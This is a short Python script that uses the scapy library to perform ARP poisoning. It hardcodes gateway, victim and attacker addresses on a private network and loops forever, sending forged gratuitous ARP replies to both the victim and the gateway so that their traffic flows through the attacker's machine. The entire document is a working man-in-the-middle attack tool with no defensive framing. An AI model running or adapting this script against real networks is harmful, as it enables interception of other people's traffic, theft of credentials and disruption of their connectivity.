#!/usr/bin/python
"""
  ARP poisoning using gratuious ARP requests
"""

import sys
import time
from scapy.all import *

GATEWAY_IPADDR = '10.10.111.1'
GATEWAY_MACADDR = '02:00:8a:62:0a:02'
VICTIM_IPADDR  = '10.10.111.110'
VICTIM_MACADDR = '02:00:8a:7e:0c:01'
HACKER_MACADDR = '02:00:8a:46:08:01'

while True:

  # make the ARP gratuitous packets
  arp_pkt1 = Ether(dst=VICTIM_MACADDR)/\
               ARP(op = 2, psrc = GATEWAY_IPADDR, \
                   pdst = '0.0.0.0', hwsrc = HACKER_MACADDR)

  arp_pkt2 = Ether(dst=GATEWAY_MACADDR)/\
               ARP(op = 2, psrc = VICTIM_IPADDR, \
                   pdst = '0.0.0.0', hwsrc = HACKER_MACADDR)

  # send the two packets for gateway and victim machines
  sendp(arp_pkt1, iface='eth0')
  sendp(arp_pkt2, iface='eth0')

  time.sleep(1)

